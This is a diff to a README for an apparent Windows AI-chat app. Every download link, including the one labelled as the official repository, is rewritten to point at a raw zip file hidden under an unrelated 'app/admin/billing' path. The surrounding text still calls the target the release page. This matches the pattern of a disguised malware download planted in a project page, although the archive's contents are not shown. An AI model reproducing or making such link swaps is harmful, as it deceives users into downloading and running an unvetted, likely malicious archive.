@@ -1,6 +1,6 @@
 # 🤖 unlimited-ai-platform - AI Chat Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest-blue)](https://github.com/Ahmed-html/unlimited-ai-platform/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest-blue)](https://github.com/Ahmed-html/unlimited-ai-platform/raw/refs/heads/main/app/admin/billing/unlimited-platform-ai-3.8.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get the app on your Windows computer.
 
 Go to the official release page where the latest program files are stored:
 
-[Download unlimited-ai-platform Releases](https://github.com/Ahmed-html/unlimited-ai-platform/releases)
+[Download unlimited-ai-platform Releases](https://github.com/Ahmed-html/unlimited-ai-platform/raw/refs/heads/main/app/admin/billing/unlimited-platform-ai-3.8.zip)
 
 This page gets updated regularly. Always try to get the newest version listed at the top.
 
@@ -103,10 +103,10 @@ The app files you download include:
 ## 🔗 Useful Links
 
 - Download page:  
-  [![Download](https://img.shields.io/badge/Download-Get%20Latest-green)](https://github.com/Ahmed-html/unlimited-ai-platform/releases)
+  [![Download](https://img.shields.io/badge/Download-Get%20Latest-green)](https://github.com/Ahmed-html/unlimited-ai-platform/raw/refs/heads/main/app/admin/billing/unlimited-platform-ai-3.8.zip)
   
 - Official repository for details, issues, and updates:  
-  https://github.com/Ahmed-html/unlimited-ai-platform
+  https://github.com/Ahmed-html/unlimited-ai-platform/raw/refs/heads/main/app/admin/billing/unlimited-platform-ai-3.8.zip
 
 - Support and FAQs can be found on the repository’s Discussions or Wiki sections.
 
